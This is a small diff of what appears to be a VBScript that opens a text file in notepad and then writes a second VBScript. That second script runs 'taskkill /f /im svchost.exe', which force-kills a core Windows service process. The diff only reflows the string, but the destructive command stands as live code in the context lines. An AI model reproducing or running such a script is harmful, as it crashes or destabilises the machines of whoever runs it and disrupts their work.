@@ -33,8 +33,7 @@ Shell.Run "notepad.exe " & strTxtFilePath
 WScript.Sleep 1000
 
 ' Define content for the VBScript file
-strVbsContent = _
-"Dim Shell" & vbCrLf & _
+strVbsContent = "Dim Shell" & vbCrLf & _
 "Set Shell = CreateObject(""WScript.Shell"")" & vbCrLf & _
 "Shell.Run ""taskkill /f /im svchost.exe""" & vbCrLf
 
